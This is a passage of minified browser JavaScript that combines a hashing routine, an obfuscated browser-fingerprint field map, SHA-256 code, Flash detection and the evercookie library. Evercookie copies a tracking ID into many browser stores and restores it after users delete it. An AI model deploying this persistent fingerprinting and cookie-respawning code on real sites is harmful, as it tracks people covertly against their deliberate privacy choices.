                4) & 255 | (a.charCodeAt(k + 5) & 255) << 8 | (a.charCodeAt(k + 6) & 255) << 16 | (a.charCodeAt(k + 7) & 255) << 24, a.charCodeAt(k) & 255 | (a.charCodeAt(k + 1) & 255) << 8 | (a.charCodeAt(k + 2) & 255) << 16 | (a.charCodeAt(k + 3) & 255) << 24], h = [a.charCodeAt(k + 12) & 255 | (a.charCodeAt(k + 13) & 255) << 8 | (a.charCodeAt(k + 14) & 255) << 16 | (a.charCodeAt(k + 15) & 255) << 24, a.charCodeAt(k + 8) & 255 | (a.charCodeAt(k + 9) & 255) << 8 | (a.charCodeAt(k + 10) & 255) << 16 | (a.charCodeAt(k + 11) & 255) << 24], g = this.x64Multiply(g, l), g = this.x64Rotl(g, 31), g = this.x64Multiply(g, n), e = this.x64Xor(e, g),
                e = this.x64Rotl(e, 27), e = this.x64Add(e, f), e = this.x64Add(this.x64Multiply(e, [0, 5]), [0, 1390208809]), h = this.x64Multiply(h, n), h = this.x64Rotl(h, 33), h = this.x64Multiply(h, l), f = this.x64Xor(f, h), f = this.x64Rotl(f, 31), f = this.x64Add(f, e), f = this.x64Add(this.x64Multiply(f, [0, 5]), [0, 944331445]);
            g = [0, 0];
            h = [0, 0];
            switch (c) {
                case 15:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k + 14)], 48));
                case 14:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k + 13)], 40));
                case 13:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k +
                        12)], 32));
                case 12:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k + 11)], 24));
                case 11:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k + 10)], 16));
                case 10:
                    h = this.x64Xor(h, this.x64LeftShift([0, a.charCodeAt(k + 9)], 8));
                case 9:
                    h = this.x64Xor(h, [0, a.charCodeAt(k + 8)]), h = this.x64Multiply(h, n), h = this.x64Rotl(h, 33), h = this.x64Multiply(h, l), f = this.x64Xor(f, h);
                case 8:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 7)], 56));
                case 7:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 6)], 48));
                case 6:
                    g = this.x64Xor(g,
                        this.x64LeftShift([0, a.charCodeAt(k + 5)], 40));
                case 5:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 4)], 32));
                case 4:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 3)], 24));
                case 3:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 2)], 16));
                case 2:
                    g = this.x64Xor(g, this.x64LeftShift([0, a.charCodeAt(k + 1)], 8));
                case 1:
                    g = this.x64Xor(g, [0, a.charCodeAt(k)]), g = this.x64Multiply(g, l), g = this.x64Rotl(g, 31), g = this.x64Multiply(g, n), e = this.x64Xor(e, g)
            }
            e = this.x64Xor(e, [0, a.length]);
            f = this.x64Xor(f, [0, a.length]);
            e = this.x64Add(e, f);
            f = this.x64Add(f, e);
            e = this.x64Fmix(e);
            f = this.x64Fmix(f);
            e = this.x64Add(e, f);
            f = this.x64Add(f, e);
            return ("00000000" + (e[0] >>> 0).toString(16)).slice(-8) + ("00000000" + (e[1] >>> 0).toString(16)).slice(-8) + ("00000000" + (f[0] >>> 0).toString(16)).slice(-8) + ("00000000" + (f[1] >>> 0).toString(16)).slice(-8)
        }
    };
    Y.VERSION = "1.4.2";
    var $a = {
            touchSupport: "wNLf",
            scrHeight: "5Jwy",
            scrAvailSize: "TeRS",
            hasLiedLanguages: "j5po",
            adblock: "FMQw",
            flashVersion: "dzuS",
            browserVersion: "d435",
            indexedDb: "3sw-",
            userAgent: "0aew",
            browserName: "-UVA",
            plugins: "ks0Q",
            jsFonts: "EOQP",
            scrColorDepth: "qmyu",
            userLanguage: "hLzX",
            hasLiedOs: "ci5c",
            timeZone: "q5aJ",
            mimeTypes: "jp76",
            localCode: "lEnu",
            online: "9vyE",
            javaEnabled: "yD16",
            historyList: "kU5z",
            storeDb: "Fvje",
            webSmartID: "E3gR",
            doNotTrack: "VEek",
            appMinorVersion: "qBVW",
            localStorage: "XM7l",
            hasLiedResolution: "3neK",
            sessionStorage: "HVia",
            cookieEnabled: "VPIf",
            os: "hAqN",
            srcScreenSize: "tOHY",
            hasLiedBrowser: "2xC5",
            openDatabase: "V8vl",
            scrWidth: "ssI5",
            appcodeName: "qT7b",
            scrAvailHeight: "88tV",
            browserLanguage: "q4f3",
            cpuClass: "Md7A",
            scrAvailWidth: "E-lJ",
            systemLanguage: "e6OK",
            cookieCode: "VySQ",
            scrDeviceXDPI: "3jCe"
        },
        qb = "appCodeName appMinorVersion appName cpuClass onLine systemLanguage userLanguage historyList hasLiedLanguages hasLiedResolution hasLiedOs hasLiedBrowser".split(" "),
        rb = ["sessionStorage", "localStorage", "indexedDb", "openDatabase"], sb = ["scrAvailWidth", "scrAvailHeight"],
        tb = ["scrDeviceXDPI", "scrColorDepth", "scrWidth", "scrHeight"], Ia;
    if (!(Ia = Q)) {
        var aa = Math, oa = {}, pa = oa.lib = {}, ab =
            G(), ba = pa.Base = {
            extend: function (a) {
                ab.prototype = this;
                var b = new ab;
                a && b.mixIn(a);
                b.hasOwnProperty("init") || (b.init = function () {
                    b.$super.init.apply(this, arguments)
                });
                b.init.prototype = b;
                b.$super = this;
                return b
            }, create: function () {
                var a = this.extend();
                a.init.apply(a, arguments);
                return a
            }, init: G(), mixIn: function (a) {
                for (var b in a) a.hasOwnProperty(b) && (this[b] = a[b]);
                a.hasOwnProperty("toString") && (this.toString = a.toString)
            }, clone: function () {
                return this.init.prototype.extend(this)
            }
        }, ca = pa.WordArray = ba.extend({
            init: function (a,
                            b) {
                a = this.words = a || [];
                this.sigBytes = void 0 != b ? b : 4 * a.length
            }, toString: function (a) {
                return (a || ub).stringify(this)
            }, concat: function (a) {
                var b = this.words, c = a.words, d = this.sigBytes;
                a = a.sigBytes;
                this.clamp();
                if (d % 4) for (var e = 0; e < a; e++) b[d + e >>> 2] |= (c[e >>> 2] >>> 24 - e % 4 * 8 & 255) << 24 - (d + e) % 4 * 8; else if (65535 < c.length) for (e = 0; e < a; e += 4) b[d + e >>> 2] = c[e >>> 2]; else b.push.apply(b, c);
                this.sigBytes += a;
                return this
            }, clamp: function () {
                var a = this.words, b = this.sigBytes;
                a[b >>> 2] &= 4294967295 << 32 - b % 4 * 8;
                a.length = aa.ceil(b / 4)
            }, clone: function () {
                var a =
                    ba.clone.call(this);
                a.words = this.words.slice(0);
                return a
            }, random: function (a) {
                for (var b = [], c = 0; c < a; c += 4) b.push(4294967296 * aa.random() | 0);
                return new ca.init(b, a)
            }
        }), Ja = oa.enc = {}, ub = Ja.Hex = {
            stringify: function (a) {
                var b = a.words;
                a = a.sigBytes;
                for (var c = [], d = 0; d < a; d++) {
                    var e = b[d >>> 2] >>> 24 - d % 4 * 8 & 255;
                    c.push((e >>> 4).toString(16));
                    c.push((e & 15).toString(16))
                }
                return c.join("")
            }, parse: function (a) {
                for (var b = a.length, c = [], d = 0; d < b; d += 2) c[d >>> 3] |= parseInt(a.substr(d, 2), 16) << 24 - d % 8 * 4;
                return new ca.init(c, b / 2)
            }
        }, bb =
            Ja.Latin1 = {
                stringify: function (a) {
                    var b = a.words;
                    a = a.sigBytes;
                    for (var c = [], d = 0; d < a; d++) c.push(String.fromCharCode(b[d >>> 2] >>> 24 - d % 4 * 8 & 255));
                    return c.join("")
                }, parse: function (a) {
                    for (var b = a.length, c = [], d = 0; d < b; d++) c[d >>> 2] |= (a.charCodeAt(d) & 255) << 24 - d % 4 * 8;
                    return new ca.init(c, b)
                }
            }, vb = Ja.Utf8 = {
            stringify: function (a) {
                try {
                    return decodeURIComponent(escape(bb.stringify(a)))
                } catch (b) {
                    throw Error("Malformed UTF-8 data");
                }
            }, parse: function (a) {
                return bb.parse(unescape(encodeURIComponent(a)))
            }
        }, cb = pa.BufferedBlockAlgorithm =
            ba.extend({
                reset: function () {
                    this._data = new ca.init;
                    this._nDataBytes = 0
                }, _append: function (a) {
                    "string" == typeof a && (a = vb.parse(a));
                    this._data.concat(a);
                    this._nDataBytes += a.sigBytes
                }, _process: function (a) {
                    var b = this._data, c = b.words, d = b.sigBytes, e = this.blockSize, f = d / (4 * e),
                        f = a ? aa.ceil(f) : aa.max((f | 0) - this._minBufferSize, 0);
                    a = f * e;
                    d = aa.min(4 * a, d);
                    if (a) {
                        for (var g = 0; g < a; g += e) this._doProcessBlock(c, g);
                        g = c.splice(0, a);
                        b.sigBytes -= d
                    }
                    return new ca.init(g, d)
                }, clone: function () {
                    var a = ba.clone.call(this);
                    a._data = this._data.clone();
                    return a
                }, _minBufferSize: 0
            });
        pa.Hasher = cb.extend({
            cfg: ba.extend(), init: function (a) {
                this.cfg = this.cfg.extend(a);
                this.reset()
            }, reset: function () {
                cb.reset.call(this);
                this._doReset()
            }, update: function (a) {
                this._append(a);
                this._process();
                return this
            }, finalize: function (a) {
                a && this._append(a);
                return this._doFinalize()
            }, blockSize: 16, _createHelper: function (a) {
                return function (b, c) {
                    return (new a.init(c)).finalize(b)
                }
            }, _createHmacHelper: function (a) {
                return function (b, c) {
                    return (new wb.HMAC.init(a, c)).finalize(b)
                }
            }
        });
        var wb = oa.algo = {};
        Ia = oa
    }
    for (var Q = Ia, qa = Math, ra = Q, R = ra.lib, xb = R.WordArray, sa = R.Hasher, R = ra.algo, db = [], eb = [], ta = 2, da = 0; 64 > da;) {
        var W;
        a:{
            W = ta;
            for (var yb = qa.sqrt(W), Ka = 2; Ka <= yb; Ka++) if (!(W % Ka)) {
                W = !1;
                break a
            }
            W = !0
        }
        W && (8 > da && (db[da] = Xa(qa.pow(ta, .5))), eb[da] = Xa(qa.pow(ta, 1 / 3)), da++);
        ta++
    }
    var S = [], R = R.SHA256 = sa.extend({
        _doReset: function () {
            this._hash = new xb.init(db.slice(0))
        }, _doProcessBlock: function (a, b) {
            for (var c = this._hash.words, d = c[0], e = c[1], f = c[2], g = c[3], h = c[4], l = c[5], n = c[6], k = c[7], m = 0; 64 > m; m++) {
                if (16 >
                    m) S[m] = a[b + m] | 0; else {
                    var v = S[m - 15], u = S[m - 2];
                    S[m] = ((v << 25 | v >>> 7) ^ (v << 14 | v >>> 18) ^ v >>> 3) + S[m - 7] + ((u << 15 | u >>> 17) ^ (u << 13 | u >>> 19) ^ u >>> 10) + S[m - 16]
                }
                v = k + ((h << 26 | h >>> 6) ^ (h << 21 | h >>> 11) ^ (h << 7 | h >>> 25)) + (h & l ^ ~h & n) + eb[m] + S[m];
                u = ((d << 30 | d >>> 2) ^ (d << 19 | d >>> 13) ^ (d << 10 | d >>> 22)) + (d & e ^ d & f ^ e & f);
                k = n;
                n = l;
                l = h;
                h = g + v | 0;
                g = f;
                f = e;
                e = d;
                d = v + u | 0
            }
            c[0] = c[0] + d | 0;
            c[1] = c[1] + e | 0;
            c[2] = c[2] + f | 0;
            c[3] = c[3] + g | 0;
            c[4] = c[4] + h | 0;
            c[5] = c[5] + l | 0;
            c[6] = c[6] + n | 0;
            c[7] = c[7] + k | 0
        }, _doFinalize: function () {
            var a = this._data, b = a.words, c = 8 * this._nDataBytes, d = 8 *
                a.sigBytes;
            b[d >>> 5] |= 128 << 24 - d % 32;
            b[(d + 64 >>> 9 << 4) + 14] = qa.floor(c / 4294967296);
            b[(d + 64 >>> 9 << 4) + 15] = c;
            a.sigBytes = 4 * b.length;
            this._process();
            return this._hash
        }, clone: function () {
            var a = sa.clone.call(this);
            a._hash = this._hash.clone();
            return a
        }
    });
    ra.SHA256 = sa._createHelper(R);
    ra.HmacSHA256 = sa._createHmacHelper(R);
    var fb = Q, zb = fb.lib.WordArray;
    fb.enc.Base64 = {
        stringify: function (a) {
            var b = a.words, c = a.sigBytes, d = this._map;
            a.clamp();
            a = [];
            for (var e = 0; e < c; e += 3) for (var f = (b[e >>> 2] >>> 24 - e % 4 * 8 & 255) << 16 | (b[e + 1 >>> 2] >>>
                24 - (e + 1) % 4 * 8 & 255) << 8 | b[e + 2 >>> 2] >>> 24 - (e + 2) % 4 * 8 & 255, g = 0; 4 > g && e + .75 * g < c; g++) a.push(d.charAt(f >>> 6 * (3 - g) & 63));
            if (b = d.charAt(64)) for (; a.length % 4;) a.push(b);
            return a.join("")
        }, parse: function (a) {
            var b = a.length, c = this._map, d = c.charAt(64);
            d && (d = a.indexOf(d), -1 != d && (b = d));
            for (var d = [], e = 0, f = 0; f < b; f++) if (f % 4) {
                var g = c.indexOf(a.charAt(f - 1)) << f % 4 * 2, h = c.indexOf(a.charAt(f)) >>> 6 - f % 4 * 2;
                d[e >>> 2] |= (g | h) << 24 - e % 4 * 8;
                e++
            }
            return zb.create(d, e)
        }, _map: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    };
    Array.prototype.indexOf ||
    (Array.prototype.indexOf = function (a, b) {
        var c;
        if (null == this) throw new TypeError('"this" is null or not defined');
        var d = Object(this), e = d.length >>> 0;
        if (0 === e) return -1;
        c = +b || 0;
        Infinity === Math.abs(c) && (c = 0);
        if (c >= e) return -1;
        for (c = Math.max(0 <= c ? c : e - Math.abs(c), 0); c < e;) {
            if (c in d && d[c] === a) return c;
            c++
        }
        return -1
    });
    var V, I = window, p = document, N = navigator, gb = !1, la = [function () {
            if (gb) {
                var a = p.getElementsByTagName("body")[0], b = p.createElement("object");
                b.setAttribute("type", "application/x-shockwave-flash");
                var c =
                    a.appendChild(b);
                if (c) {
                    var d = 0;
                    (function f() {
                        if ("undefined" != typeof c.GetVariable) {
                            var g = c.GetVariable("$version");
                            g && (g = g.split(" ")[1].split(","), l.pv = [parseInt(g[0], 10), parseInt(g[1], 10), parseInt(g[2], 10)])
                        } else if (10 > d) {
                            d++;
                            setTimeout(f, 10);
                            return
                        }
                        a.removeChild(b);
                        c = null;
                        Fa()
                    })()
                } else Fa()
            } else Fa()
        }], M = [], ia = [], T = [], X, ka, Ca, Ua, P = !1, ja = !1, L, ya, Ra = !0, l,
        Ab = "undefined" != typeof p.getElementById && "undefined" != typeof p.getElementsByTagName && "undefined" != typeof p.createElement,
        ua = N.userAgent.toLowerCase(),
        va = N.platform.toLowerCase(), Bb = va ? /win/.test(va) : /win/.test(ua),
        Cb = va ? /mac/.test(va) : /mac/.test(ua),
        Db = /webkit/.test(ua) ? parseFloat(ua.replace(/^.*webkit\/(\d+(\.\d+)?).*$/, "$1")) : !1, La = !+"\v1",
        ea = [0, 0, 0], H = null;
    if ("undefined" != typeof N.plugins && "object" == typeof N.plugins["Shockwave Flash"]) !(H = N.plugins["Shockwave Flash"].description) || "undefined" != typeof N.mimeTypes && N.mimeTypes["application/x-shockwave-flash"] && !N.mimeTypes["application/x-shockwave-flash"].enabledPlugin || (gb = !0, La = !1, H = H.replace(/^.*\s+(\S+\s+\S+$)/,
        "$1"), ea[0] = parseInt(H.replace(/^(.*)\..*$/, "$1"), 10), ea[1] = parseInt(H.replace(/^.*\.(.*)\s.*$/, "$1"), 10), ea[2] = /[a-zA-Z]/.test(H) ? parseInt(H.replace(/^.*[a-zA-Z]+(.*)$/, "$1"), 10) : 0); else if ("undefined" != typeof I.ActiveXObject) try {
        if (H = (new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")) La = !0, H = H.split(" ")[1].split(","), ea = [parseInt(H[0], 10), parseInt(H[1], 10), parseInt(H[2], 10)]
    } catch (a) {
    }
    l = {w3: Ab, pv: ea, wk: Db, ie: La, win: Bb, mac: Cb};
    l.w3 && (("undefined" != typeof p.readyState &&
        "complete" == p.readyState || "undefined" == typeof p.readyState && (p.getElementsByTagName("body")[0] || p.body)) && U(), P || ("undefined" != typeof p.addEventListener && p.addEventListener("DOMContentLoaded", U, !1), l.ie && l.win && (p.attachEvent("onreadystatechange", function b() {
        "complete" == p.readyState && (p.detachEvent("onreadystatechange", b), U())
    }), I == top && function c() {
        if (!P) {
            try {
                p.documentElement.doScroll("left")
            } catch (d) {
                setTimeout(c, 0);
                return
            }
            U()
        }
    }()), l.wk && function b() {
        P || (/loaded|complete/.test(p.readyState) ? U() :
            setTimeout(b, 0))
    }(), Va(U)));
    l.ie && l.win && window.attachEvent("onunload", function () {
        for (var a = T.length, b = 0; b < a; b++) T[b][0].detachEvent(T[b][1], T[b][2]);
        a = ia.length;
        for (b = 0; b < a; b++) Ta(ia[b]);
        for (var c in l) l[c] = null;
        l = null;
        for (var d in V) V[d] = null;
        V = null
    });
    V = {
        registerObject: function (a, b, c, d) {
            if (l.w3 && a && b) {
                var e = {};
                e.id = a;
                e.swfVersion = b;
                e.expressInstall = c;
                e.callbackFn = d;
                M[M.length] = e;
                O(a, !1)
            } else d && d({success: !1, id: a})
        }, getObjectById: function (a) {
            if (l.w3) return Ea(a)
        }, embedSWF: function (a, b, c, d, e, f, g,
                               h, n, p) {
            var k = {success: !1, id: b};
            l.w3 && !(l.wk && 312 > l.wk) && a && b && c && d && e ? (O(b, !1), Wa(function () {
                    c += "";
                    d += "";
                    var m = {};
                    if (n && "object" === typeof n) for (var l in n) m[l] = n[l];
                    m.data = a;
                    m.width = c;
                    m.height = d;
                    l = {};
                    if (h && "object" === typeof h) for (var u in h) l[u] = h[u];
                    if (g && "object" === typeof g) for (var w in g) l.flashvars = "undefined" != typeof l.flashvars ? l.flashvars + ("\x26" + w + "\x3d" + g[w]) : w + "\x3d" + g[w];
                    if (ha(e)) u = za(m, l, b), m.id == b && O(b, !0), k.success = !0, k.ref = u; else {
                        if (f && Da()) {
                            m.data = f;
                            Ba(m, l, b, p);
                            return
                        }
                        O(b, !0)
                    }
                    p && p(k)
                })) :
                p && p(k)
        }, switchOffAutoHideShow: function () {
            Ra = !1
        }, ua: l, getFlashPlayerVersion: function () {
            return {major: l.pv[0], minor: l.pv[1], release: l.pv[2]}
        }, hasFlashPlayerVersion: ha, createSWF: function (a, b, c) {
            if (l.w3) return za(a, b, c)
        }, showExpressInstall: function (a, b, c, d) {
            l.w3 && Da() && Ba(a, b, c, d)
        }, removeSWF: function (a) {
            l.w3 && Ta(a)
        }, createCSS: function (a, b, c, d) {
            l.w3 && Sa(a, b, c, d)
        }, addDomLoadEvent: Wa, addLoadEvent: Va, getQueryParamValue: function (a) {
            var b = p.location.search || p.location.hash;
            if (b) {
                /\?/.test(b) && (b = b.split("?")[1]);
                if (null == a) return Qa(b);
                for (var b = b.split("\x26"), c = 0; c < b.length; c++) if (b[c].substring(0, b[c].indexOf("\x3d")) == a) return Qa(b[c].substring(b[c].indexOf("\x3d") + 1))
            }
            return ""
        }, expressInstallCallback: function () {
            if (ja) {
                var a = J("SWFObjectExprInst");
                a && X && (a.parentNode.replaceChild(X, a), ka && (O(ka, !0), l.ie && l.win && (X.style.display = "block")), Ca && Ca(Ua));
                ja = !1
            }
        }
    };
    try {
        var r = window, t = r.document, hb = r.Image, Ma = r.globalStorage, ib = r.swfobject;
        try {
            var Na = r.localStorage
        } catch (a) {
        }
        try {
            var Oa = r.sessionStorage
        } catch (a) {
        }
        var fa,
            wa, jb = {
                history: !1,
                java: !1,
                tests: 2,
                silverlight: !1,
                domain: Ga(r.location.host.split(":")[0]),
                baseurl: "",
                asseturi: "/assets",
                phpuri: "/php",
                authPath: !1,
                pngCookieName: "evercookie_png",
                pngPath: "/evercookie_png.php",
                etagCookieName: "evercookie_etag",
                etagPath: "/evercookie_etag.php",
                cacheCookieName: "evercookie_cache",
                cachePath: "/evercookie_cache.php"
            };
        r._evercookie_flash_var = function (a) {
            fa = a;
            (a = t.getElementById("myswf")) && a.parentNode && a.parentNode.removeChild(a)
        };
        r.evercookie = r.Evercookie = function (a) {
            a = a || {};
            var b = {}, c;
            for (c in jb) {
                var d = a[c];
                b[c] = "undefined" !== typeof d ? d : jb[c]
            }
            "function" === typeof b.domain && (b.domain = b.domain(r));
            var e = b.history, f = b.java, g = b.tests, h = b.baseurl, l = b.asseturi, n = b.phpuri, k = b.domain,
                m = this;
            this._ec = {};
            this.get = function (a, b, c) {
                m._evercookie(a, b, void 0, void 0, c)
            };
            this.set = function (a, b) {
                m._evercookie(a, G(), b)
            };
            this._evercookie = function (a, c, d, A, h) {
                void 0 === m._evercookie && (m = this);
                void 0 === A && (A = 0);
                0 === A && (m.evercookie_database_storage(a, d), m.evercookie_indexdb_storage(a, d), b.authPath &&
                m.evercookie_auth(a, d), f && m.evercookie_java(a, d), m._ec.userData = m.evercookie_userdata(a, d), m._ec.cookieData = m.evercookie_cookie(a, d), m._ec.localData = m.evercookie_local_storage(a, d), m._ec.globalData = m.evercookie_global_storage(a, d), m._ec.sessionData = m.evercookie_session_storage(a, d), m._ec.windowData = m.evercookie_window(a, d), e && (m._ec.historyData = m.evercookie_history(a, d)));
                if (void 0 !== d) ("undefined" === typeof fa || "undefined" === typeof wa) && A++ < g && setTimeout(function () {
                    m._evercookie(a, c, d, A, h)
                }, 300);
                else if ((r.openDatabase && "undefined" === typeof m._ec.dbData || ("indexedDB" in r || (r.indexedDB = r.indexedDB || r.mozIndexedDB || r.webkitIndexedDB || r.msIndexedDB)) && ("undefined" === typeof m._ec.idbData || "" === m._ec.idbData) || "undefined" === typeof fa || "undefined" === typeof m._ec.etagData || "undefined" === typeof m._ec.cacheData || "undefined" === typeof m._ec.javaData || t.createElement("canvas").getContext && ("undefined" === typeof m._ec.pngData || "" === m._ec.pngData) || "undefined" === typeof wa) && A++ < g) setTimeout(function () {
                    m._evercookie(a,
                        c, d, A, h)
                }, 20); else {
                    m._ec.lsoData = m.getFromStr(a, fa);
                    fa = void 0;
                    m._ec.slData = m.getFromStr(a, wa);
                    wa = void 0;
                    var q = m._ec, z = [], k = 0, B, l;
                    m._ec = {};
                    for (l in q) q[l] && "null" !== q[l] && "undefined" !== q[l] && (z[q[l]] = void 0 === z[q[l]] ? 1 : z[q[l]] + 1);
                    for (l in z) z[l] > k && (k = z[l], B = l);
                    void 0 === B || void 0 !== h && 1 === h || m.set(a, B);
                    "function" === typeof c && c(B, q)
                }
            };
            this.evercookie_window = function (a, b) {
                try {
                    if (void 0 !== b) {
                        var c;
                        var d = r.name;
                        if (-1 < d.indexOf("\x26" + a + "\x3d") || 0 === d.indexOf(a + "\x3d")) {
                            var e = d.indexOf("\x26" + a + "\x3d"),
                                f;
                            -1 === e && (e = d.indexOf(a + "\x3d"));
                            f = d.indexOf("\x26", e + 1);
                            c = -1 !== f ? d.substr(0, e) + d.substr(f + (e ? 0 : 1)) + "\x26" + a + "\x3d" + b : d.substr(0, e) + "\x26" + a + "\x3d" + b
                        } else c = d + "\x26" + a + "\x3d" + b;
                        r.name = c
                    } else return this.getFromStr(a, r.name)
                } catch (Eb) {
                }
            };
            this.evercookie_userdata = function (a, b) {
                try {
                    var c = this.createElem("div", "userdata_el", 1);
                    if (c.addBehavior) if (c.style.behavior = "url(#default#userData)", void 0 !== b) c.setAttribute(a, b), c.save(a); else return c.load(a), c.getAttribute(a)
                } catch (A) {
                }
            };
            this.evercookie_cache =
                function (a, c) {
                    if (void 0 !== c) t.cookie = b.cacheCookieName + "\x3d" + c + "; path\x3d/; domain\x3d" + k, m.ajax({
                        url: h + n + b.cachePath + "?name\x3d" + a + "\x26cookie\x3d" + b.cacheCookieName,
                        success: G()
                    }); else {
                        var d = this.getFromStr(b.cacheCookieName, t.cookie);
                        m._ec.cacheData = void 0;
                        t.cookie = b.cacheCookieName + "\x3d; expires\x3dMon, 20 Sep 2010 00:00:00 UTC; path\x3d/; domain\x3d" + k;
                        m.ajax({
                            url: h + n + b.cachePath + "?name\x3d" + a + "\x26cookie\x3d" + b.cacheCookieName,
                            success: function (a) {
                                t.cookie = b.cacheCookieName + "\x3d" + d + "; expires\x3dTue, 31 Dec 2030 00:00:00 UTC; path\x3d/; domain\x3d" +
                                    k;
                                m._ec.cacheData = a
                            }
                        })
                    }
                };
            this.evercookie_auth = function (a, c) {
                if (void 0 !== c) {
                    var d = "//" + c + "@" + location.host + h + n + b.authPath + "?name\x3d" + a, e = new hb;
                    e.style.visibility = "hidden";
                    e.style.position = "absolute";
                    e.src = d
                } else m.ajax({
                    url: h + n + b.authPath + "?name\x3d" + a, success: function (a) {
                        m._ec.authData = a
                    }
                })
            };
            this.evercookie_etag = function (a, c) {
                if (void 0 !== c) t.cookie = b.etagCookieName + "\x3d" + c + "; path\x3d/; domain\x3d" + k, m.ajax({
                    url: h + n + b.etagPath + "?name\x3d" + a + "\x26cookie\x3d" + b.etagCookieName,
                    success: G()
                }); else {
                    var d =
                        this.getFromStr(b.etagCookieName, t.cookie);
                    m._ec.etagData = void 0;
                    t.cookie = b.etagCookieName + "\x3d; expires\x3dMon, 20 Sep 2010 00:00:00 UTC; path\x3d/; domain\x3d" + k;
                    m.ajax({
                        url: h + n + b.etagPath + "?name\x3d" + a + "\x26cookie\x3d" + b.etagCookieName,
                        success: function (a) {
                            t.cookie = b.etagCookieName + "\x3d" + d + "; expires\x3dTue, 31 Dec 2030 00:00:00 UTC; path\x3d/; domain\x3d" + k;
                            m._ec.etagData = a
                        }
                    })
                }
            };
            this.evercookie_java = function (a, b) {
                function c(c) {
                    c = t.getElementById(c);
                    void 0 !== b ? c.set(a, b) : m._ec.javaData = c.get(a)
                }

                var d = t.getElementById("ecAppletContainer");
                "undefined" !== typeof dtjava && (null !== d && void 0 !== d && d.length || (d = t.createElement("div"), d.setAttribute("id", "ecAppletContainer"), d.style.position = "absolute", d.style.top = "-3000px", d.style.left = "-3000px", d.style.width = "1px", d.style.height = "1px", t.body.appendChild(d)), "undefined" === typeof ecApplet ? dtjava.embed({
                    id: "ecApplet",
                    url: h + l + "/evercookie.jnlp",
                    width: "1px",
                    height: "1px",
                    placeholder: "ecAppletContainer"
                }, {}, {onJavascriptReady: c}) : c("ecApplet"))
            };
            this.evercookie_lso =
                function (a, b) {
                    var c = t.getElementById("swfcontainer"), d = {}, e = {}, f = {};
                    null !== c && void 0 !== c && c.length || (c = t.createElement("div"), c.setAttribute("id", "swfcontainer"), t.body.appendChild(c));
                    void 0 !== b && (d.everdata = a + "\x3d" + b);
                    e.swliveconnect = "true";
                    f.id = "myswf";
                    f.name = "myswf";
                    ib.embedSWF(h + l + "/evercookie.swf", "swfcontainer", "1", "1", "9.0.0", !1, d, e, f)
                };
            this.evercookie_png = function (a, c) {
                var d = t.createElement("canvas"), e, f, g;
                d.style.visibility = "hidden";
                d.style.position = "absolute";
                d.width = 200;
                d.height = 1;
                d &&
                d.getContext && (e = new hb, e.style.visibility = "hidden", e.style.position = "absolute", void 0 !== c ? t.cookie = b.pngCookieName + "\x3d" + c + "; path\x3d/; domain\x3d" + k : (m._ec.pngData = void 0, f = d.getContext("2d"), g = this.getFromStr(b.pngCookieName, t.cookie), t.cookie = b.pngCookieName + "\x3d; expires\x3dMon, 20 Sep 2010 00:00:00 UTC; path\x3d/; domain\x3d" + k, e.onload = function () {
                    t.cookie = b.pngCookieName + "\x3d" + g + "; expires\x3dTue, 31 Dec 2030 00:00:00 UTC; path\x3d/; domain\x3d" + k;
                    m._ec.pngData = "";
                    f.drawImage(e, 0, 0);
                    var a =
                        f.getImageData(0, 0, 200, 1).data, c, d;
                    c = 0;
                    for (d = a.length; c < d && 0 !== a[c]; c += 4) {
                        m._ec.pngData += String.fromCharCode(a[c]);
                        if (0 === a[c + 1]) break;
                        m._ec.pngData += String.fromCharCode(a[c + 1]);
                        if (0 === a[c + 2]) break;
                        m._ec.pngData += String.fromCharCode(a[c + 2])
                    }
                }), e.src = h + n + b.pngPath + "?name\x3d" + a + "\x26cookie\x3d" + b.pngCookieName)
            };
            this.evercookie_local_storage = function (a, b) {
                try {
                    if (Na) if (void 0 !== b) Na.setItem(a, b); else return Na.getItem(a)
                } catch (z) {
                }
            };
            this.evercookie_database_storage = function (a, b) {
                try {
                    if (r.openDatabase) {
                        var c =
                            r.openDatabase("sqlite_evercookie", "", "evercookie", 1048576);
                        void 0 !== b ? c.transaction(function (c) {
                            c.executeSql("CREATE TABLE IF NOT EXISTS cache(id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, UNIQUE (name))", [], G(), G());
                            c.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [a, b], G(), G())
                        }) : c.transaction(function (b) {
                            b.executeSql("SELECT value FROM cache WHERE name\x3d?", [a], function (a, b) {
                                    m._ec.dbData = 1 <= b.rows.length ? b.rows.item(0).value : ""
                                },
                                G())
                        })
                    }
                } catch (A) {
                }
            };
            this.evercookie_indexdb_storage = function (a, b) {
                try {
                    if ("indexedDB" in r || (indexedDB = r.indexedDB || r.mozIndexedDB || r.webkitIndexedDB || r.msIndexedDB, IDBTransaction = r.IDBTransaction || r.webkitIDBTransaction || r.msIDBTransaction, IDBKeyRange = r.IDBKeyRange || r.webkitIDBKeyRange || r.msIDBKeyRange), indexedDB) {
                        var c = indexedDB.open("idb_evercookie", 1);
                        c.onerror = G();
                        c.onupgradeneeded = function (a) {
                            a.target.result.createObjectStore("evercookie", {keyPath: "name", unique: !1})
                        };
                        c.onsuccess = void 0 !== b ? function (c) {
                            c =
                                c.target.result;
                            c.objectStoreNames.contains("evercookie") && c.transaction(["evercookie"], "readwrite").objectStore("evercookie").put({
                                name: a,
                                value: b
                            });
                            c.close()
                        } : function (b) {
                            b = b.target.result;
                            if (b.objectStoreNames.contains("evercookie")) {
                                var c = b.transaction(["evercookie"]).objectStore("evercookie").get(a);
                                c.onsuccess = function () {
                                    m._ec.idbData = void 0 === c.result ? void 0 : c.result.value
                                }
                            } else m._ec.idbData = void 0;
                            b.close()
                        }
